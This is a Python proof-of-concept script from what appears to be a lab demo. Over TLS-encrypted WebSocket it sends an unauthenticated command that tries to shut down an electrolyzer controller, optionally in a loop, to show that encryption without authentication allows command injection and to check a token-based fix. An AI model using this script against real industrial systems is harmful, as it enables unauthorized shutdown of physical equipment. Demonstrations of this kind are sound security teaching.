#!/usr/bin/env python3
"""
attacker.py - Malicious WSS client.

Connects over WSS (verifying the server cert, proving TLS is active)
but sends NO valid auth token. Demonstrates that WSS alone does not
prevent unauthorized command injection.

Usage:
  python3 attacker.py --once       # single attack then exit (default)
  python3 attacker.py --loop       # repeat every --interval seconds
  python3 attacker.py --loop --interval 5

Env vars (from attacker.env):
  AGENT_HOST, WSS_PORT, CA_CERT_PATH, LOG_DIR
"""

import argparse
import asyncio
import json
import logging
import os
import ssl
import sys

import websockets

# ── Config ─────────────────────────────────────────────────────────────────

AGENT_HOST   = os.environ.get("AGENT_HOST",   "10.0.1.20")
WSS_PORT     = int(os.environ.get("WSS_PORT", "8443"))
CA_CERT_PATH = os.environ.get("CA_CERT_PATH", "/opt/p2p-demo/certs/server.crt")
LOG_DIR      = os.environ.get("LOG_DIR",      "/var/log/p2p-demo")

LOG_FILE = os.path.join(LOG_DIR, "attacker.log")

# ── Logging ────────────────────────────────────────────────────────────────

os.makedirs(LOG_DIR, exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout),
    ],
)
log = logging.getLogger("attacker")


# ── Attack ──────────────────────────────────────────────────────────────────

async def attack(ssl_ctx: ssl.SSLContext) -> None:
    uri = f"wss://{AGENT_HOST}:{WSS_PORT}"
    msg = {
        "source": "attacker",
        "electrolyzer_enable": False,  # attempt to shut down electrolyzer
        # no token - demonstrating that without auth anyone can connect
    }

    log.warning("=" * 55)
    log.warning("ATTACK: connecting to %s", uri)
    log.warning("ATTACK: sending %s", msg)
    log.warning("=" * 55)

    try:
        async with websockets.connect(uri, ssl=ssl_ctx) as ws:
            log.info("TLS handshake OK - channel is encrypted (WSS active)")
            await ws.send(json.dumps(msg))
            resp = json.loads(await asyncio.wait_for(ws.recv(), timeout=10))

            if resp.get("status") == "accepted":
                log.warning("ATTACK SUCCEEDED - agent accepted without authenticating sender!")
                log.warning("WSS encrypts traffic but did NOT stop this unauthorized command.")
            else:
                log.info("Attack BLOCKED - reason: %s", resp.get("reason"))
                log.info("Fix is working: AUTH_MODE=token rejected the attacker.")
    except Exception as exc:
        log.error("Connection error: %s", exc)


async def main(args: argparse.Namespace) -> None:
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ssl_ctx.load_verify_locations(CA_CERT_PATH)
    ssl_ctx.check_hostname = False

    log.info("Attacker ready -> wss://%s:%d", AGENT_HOST, WSS_PORT)

    if args.loop:
        while True:
            await attack(ssl_ctx)
            log.info("Waiting %ds before next attempt...", args.interval)
            await asyncio.sleep(args.interval)
    else:
        await attack(ssl_ctx)


# ── CLI ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WSS attacker script")
    mode = parser.add_mutually_exclusive_group()
    mode.add_argument("--once", dest="loop", action="store_false", default=False,
                      help="Send one attack message then exit (default).")
    mode.add_argument("--loop", dest="loop", action="store_true",
                      help="Repeat attack messages.")
    parser.add_argument("--interval", type=int, default=15,
                        help="Seconds between attacks in loop mode (default 15).")
    asyncio.run(main(parser.parse_args()))
